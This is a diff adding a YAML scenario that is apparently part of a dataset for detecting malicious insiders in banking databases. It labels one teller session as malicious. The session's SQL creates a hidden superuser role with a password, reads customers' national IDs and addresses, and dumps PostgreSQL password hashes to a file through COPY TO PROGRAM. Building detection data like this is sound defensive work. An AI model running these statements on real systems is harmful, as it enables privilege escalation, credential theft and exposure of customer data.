@@ -1,0 +1,21 @@
+scenario_id: banking_priv_abuse_0006
+family_id: banking_priv_abuse_0006
+domain: banking
+time_of_day: '22:30'
+default_class: malicious
+rule_engine_relationship: agrees
+sessions:
+- session_label: escalate_and_dump
+  role: teller
+  class: malicious
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.534764462813901
+  events:
+  - step_id: escalate
+    sql: CREATE ROLE admin_backup SUPERUSER LOGIN PASSWORD 'BFKQ50SD2S'
+  - sql: SELECT national_id, address FROM customers WHERE branch_id = 'BR-002'
+  - step_id: dump
+    sql: COPY (SELECT rolname, rolpassword FROM pg_authid) TO PROGRAM 'cat >> /var/lib/postgresql/.cache/creds_dump.txt'
